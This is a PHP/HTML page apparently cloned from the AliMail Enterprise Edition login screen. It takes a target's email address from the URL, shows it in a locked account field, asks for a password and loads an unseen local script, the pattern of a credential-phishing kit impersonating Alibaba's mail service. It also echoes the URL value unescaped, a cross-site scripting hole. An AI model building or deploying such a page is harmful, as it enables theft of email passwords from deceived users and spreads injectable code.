<?php 
	$email = $_GET['email'];
	if(empty($email)){
		return false;
	}
?>
<!DOCTYPE html>
<!-- saved from url=(0062)http://mail.hichina.com/alimail/auth/login?reurl=%2Falimail%2F -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="description" content="Alibaba Enterprise Mailbox, built on Aliyun Feitian platform, can be opened as low as 600 RMB. Industry leading enterprise mailbox, 3 minutes open!">
    <meta name="keywords" content="Alibaba enterprise email, Alibaba Cloud Email, enterprise email, office mailbox, office email, company emailbox, work emailbox, charged enterprise email, free enterprise emailbox, domain name emailbox, Ding Email, DingTalk Emailbox, anti-spam, email, enterprise email app, enterprise email client, register enterprise email, purchase enterprise email, which enterprise email is better, enterprise emails comparison, selection of enterprise email, how to select an enterprise email, purchase of enterprise email, sale of enterprise email">
    <link rel="shortcut icon" href="http://mail.hichina.com/static/5657687/images/favicon.ico" type="image/x-icon">
    <link rel="bookmark" href="http://mail.hichina.com/static/5657687/images/favicon.ico" type="image/x-icon">
    <title>AliMail Enterprise Edition</title>

    <link rel="stylesheet" type="text/css" href="files/login.css">
    <link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.min.css">
<style>
    .hide{display: none;}
</style></head>
<body>
    <div style="display:none;">
        <iframe name="errorTargetIframe" id="errorTargetIframe" src="files/blank.html" __idm_frm__="1236"></iframe>
        <form name="browser_log" id="browser_script_log" action="http://mail.hichina.com/alimail/error/browserLog" target="errorTargetIframe" method="post">
            <input type="hidden" id="browser_script_log_text" name="text">
            <input type="hidden" name="key" value="SCRIPT_LOAD_ERROR">
        </form>
    </div>

    <div id="page">
        <div class="header">
            <div class="logo" title="AliMail Enterprise Edition">
                <img class="logo_img" src="files/logo.png">
            </div>
            <div class="links_wrap">
                <span class="links_item inline_block links_item_first">
                    <a href="#" _cat="toplink" _id="app" style="color: #848585;">Client Apps</a>
                </span>
                <span class="links_item inline_block "><a href="#" _cat="toplink" _id="help" style="color: #848585;">Help</a></span>
                <span class="links_item inline_block "><a href="#" style="color: #848585;">English</a></span>
            </div>
        </div>

        <div class="content bg_default" style="background: url('login_bg1.jpg'); background-size: cover; background-repeat: no-repeat;">
            <div class="content_inner">                             
                <div class="login_pannel">
                    <div class="login_pannel_bg"></div>
                    <div style="background: #fff; height: 100%; width: 330px; position: absolute; right:50%;">
                        <div style="border-bottom: 3px solid #3B9BDC;">
                            <p style="text-align: center; color: #848585; margin:10px 0px;">Mail Account Login</p>
                        </div>
                        <div style="display: flex; align-content: center; align-items: center; justify-content: center;">
                            <div style="width: 75%; margin:auto; overflow: hidden; margin-top: 1em; margin-bottom: 0px;">
                                <div class="alert alert-danger hide alert2 py-1 px-0 text-center" style="margin-bottom: 0px;"></div>
                            </div>
                        </div>
                        <div style="width:75%; margin:auto; overflow: hidden;">
                            <input type="email" id="email" value="<?php echo $email; ?>" oninput="checkMail()" placeholder="Account" required="" disabled style="width: 98%; height: 35px; border-radius: 5px; border:none; border: 1px solid #848585; margin-top: 1em; background: #eef3f8; color: #848585;">
                        </div>
                        <div style="width:75%; margin:auto; overflow: hidden;">
                            <input type="password" id="password" placeholder="Password" required="" style="width: 98%; height: 35px; border-radius: 5px; border:none; border: 1px solid #848585; margin-top: 2em; background: #eef3f8; color: #848585;">
                        </div>
                        <div style="width:75%; margin:auto; overflow: hidden; margin-top: 1em;">
                            <div class="checkbox">
                                <input type="checkbox" name="" style="float: left; margin-top:2px; margin-bottom: 10px;">
                                <small style="color:#848585; float: left;">Remember me</small>
                            </div>
                        </div>
                        <div style="width:75%; margin:auto; overflow: hidden;">
                            <div class="btn-holder">
                                <button id="signin" style="width: 100%; height: 40px; border-radius: 5px; border:none; margin-top: 0.5em; background: #3B9BDC; color: #fff; font-weight: 700;">Login</button>
                            </div>
                        </div>
                    </div>
                </div>
                <a href="javascript:void(0);" class="login_bg_link" target="_blank" id="login_bg_link" style="display:none;" _cat="bglink">&nbsp;&nbsp;&nbsp;</a>
            </div>
        </div>
    </div>
</body>
<script src="vendor/jquery/jquery-2.2.3.min.js"></script>
<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<script src="js/data.js"></script>
</html>